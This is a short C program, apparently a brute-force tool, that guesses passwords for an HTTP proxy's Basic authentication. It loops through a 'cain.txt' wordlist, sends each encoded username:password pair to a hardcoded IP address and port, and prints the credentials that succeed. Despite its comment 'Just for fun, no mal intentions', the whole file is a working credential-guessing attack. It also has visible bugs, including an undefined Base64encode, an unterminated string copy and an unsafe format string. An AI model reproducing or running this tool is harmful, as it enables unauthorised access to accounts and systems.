#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <math.h>


char buffer[8192] = {0};
#define SIZE 8192

char *get_file(char *fileName)
{
	FILE	*file;
	char	*buffer;
	int	fSize, bRead;

	file = fopen(fileName, "rb");
	if (file == NULL)
		return 0;
	fseek(file, 0, SEEK_END);
	fSize = ftell(file);
	fseek(file, 0, SEEK_SET);
	buffer = (char *) malloc( fSize * sizeof(char) + 1 );
	bRead = fread(buffer, sizeof(char), fSize, file);
	if (bRead != fSize)
		return 0;
	fclose(file);
	buffer[fSize] = '\0';
	return buffer;
}



//Just for fun, no mal intentions

char *pos = NULL;
int get_dict(char *file, char *pass)
{
	char *end = NULL;

	if (pos == NULL)
		pos = file;

	pos = strstr(pos, "\n");
	if (pos == NULL)
		return -1;
	pos++;
	end = strstr(pos, "\n");
	if (end == NULL)
		return -1;

	memcpy(pass, pos, (int)(end - pos));
	return 0;
}

int proxy_connect(char *request, char *ip, int port)
{
	struct sockaddr_in      servaddr;
	int sock = -1;
	int ret = 0;

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);	
        memset(&servaddr, 0, sizeof(struct sockaddr_in));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = inet_addr(ip);
        servaddr.sin_port = htons(port);

        ret = connect(sock, (struct sockaddr *)&servaddr, sizeof(struct sockaddr_in));
        if (ret == -1)
        {
                ret = errno;

                switch (ret)
                {
                case ETIMEDOUT:
                        printf("Fatal Error: Connection timed out.\n");
                        return -1;
                case ECONNREFUSED:
                        printf("Fatal Error: Connection refused\n");
                        return -1;
                case EHOSTUNREACH:
                        printf("Fatal Error: Router sent ICMP packet (destination unreachable)\n");
                        return -1;
                default:
                        printf("Fatal Error: %d\n", ret);
                        return -1;
               }
	}

        send(sock, request, strlen(request), 0);
        memset(buffer, 0, SIZE);
        recv(sock, buffer, SIZE, 0);
        printf("response: %s\n", buffer);
	close(sock);
	if (strstr(buffer, "200 OK") != 0)
		return 0;
	else
		return 1;
}


int main(int argc, char *argv[])
{
	long long i = 0;
	char guess[512] = {0};
	char proxy_request[512] = "GET http://www.google.com HTTP/1.1\r\nProxy-Authorization: Basic %s\r\nHost: www.google.com\r\nConnection: close\r\n\r\n";
	char connect_request[512];
	char base64_str[512] = {0};
	char encoded[512] = {0};
	int ret = 0;
	char *file;

	if (argc < 2)
	{
		printf("Usage: brute username [password]\n");
		return -1;
	}

	file = (char *)get_file("cain.txt");

	for(;; i++)
	{
		get_dict(file, guess);

		if (argc == 3)
		{
			printf("Forcing password\n");
			sprintf(guess, argv[2]);
		}

		printf("Guessing \"%s\"\n", guess);
		sprintf(base64_str, "%s:%s", argv[1], guess);
		Base64encode(encoded, base64_str, strlen(base64_str) + 1);
		memcpy(&encoded[strlen(encoded) - 1], "===", 4);
		sprintf(connect_request, proxy_request, encoded);
		printf("Sending: %s\n", connect_request);
		ret = proxy_connect(connect_request, "137.168.72.206", 8080);
		sleep(60);
		if (ret == -1)
		{
			perror("error");
		}
		else if (ret == 0)
		{
			printf("User auth worked: %s\n", base64_str);
			break;
		}
		else
		{
			if (argc == 3)
				break;
		}

	}

	free((void *)file);
	return 0;
}
